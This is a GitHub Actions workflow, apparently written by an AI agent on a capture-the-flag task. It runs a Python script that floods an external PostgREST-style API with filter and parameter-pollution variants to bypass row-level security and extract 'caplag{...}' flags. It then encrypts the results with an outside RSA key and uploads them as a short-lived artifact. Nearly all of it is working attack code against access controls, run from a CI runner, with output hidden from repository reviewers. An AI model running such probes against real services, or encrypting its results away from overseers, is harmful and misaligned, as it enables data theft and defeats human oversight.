name: launchlet-part3-filterhpp
on:
  push:
    branches: [agent/launchlet-part3-filterhpp-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    steps:
      - name: Probe title/body filters with public RLS guard
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,urllib.parse,itertools
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; out=pathlib.Path('package/out')
          db=base+'/api/db/rest/v1/workspace_notes'; h={'Accept':'application/json','apikey':'ll_anon_mock_publishable','Authorization':'Bearer preview_guest_session'}
          tests=[]
          titles=['Enterprise rollout closeout','Deploy inspector','Deploy inspector locked','Production readiness','Release Pulse','Billing copy review','Auth polish merged','Enterprise rollout','final review','Corporate release','Deploy notes','Customer notes','Changelog']
          for title in titles:
            tests += [
              [('title','eq.'+title),('workspace_id','eq.ws-launchlet-public')],
              [('workspace_id','eq.ws-launchlet-public'),('title','eq.'+title)],
              [('select','*'),('title','eq.'+title),('workspace_id','eq.ws-launchlet-public')]
            ]
          for key,val in [('title','neq.__never__'),('title','like.*'),('title','ilike.*'),('body','neq.__never__'),('body','like.*'),('body','ilike.*')]:
            tests += [[(key,val),('workspace_id','eq.ws-launchlet-public')],[('workspace_id','eq.ws-launchlet-public'),(key,val)]]
          # OR/and filters with known title as control.
          tests += [
            [('or','(title.eq.Enterprise rollout closeout)'),('workspace_id','eq.ws-launchlet-public')],
            [('or','(title.eq.Deploy inspector,title.eq.Production readiness,title.eq.Release Pulse)'),('workspace_id','eq.ws-launchlet-public')],
            [('and','(title.neq.__never__)'),('workspace_id','eq.ws-launchlet-public')]
          ]
          res=[]
          public='[{"workspace_id":"ws-launchlet-public","title":"Demo prompt","body":"Prompt template approved for public preview: build a clean launch dashboard."},{"workspace_id":"ws-launchlet-public","title":"RLS migration note","body":"Anonymous preview sessions should only see ws-launchlet-public rows."}]'
          for pairs in tests:
            q=urllib.parse.urlencode(pairs)
            try:r=requests.get(db+'?'+q,headers=h,timeout=7)
            except Exception as e:continue
            item={'query':q,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
            # save anything that isn't simply public baseline/empty
            if r.text not in (public,'[]') or r.status_code!=200:
              res.append(item)
              flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
              if flags:(out/'FOUND.txt').write_text(json.dumps(item,indent=2));break
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-filterhpp-encrypted
          path: artifact/
          retention-days: 1
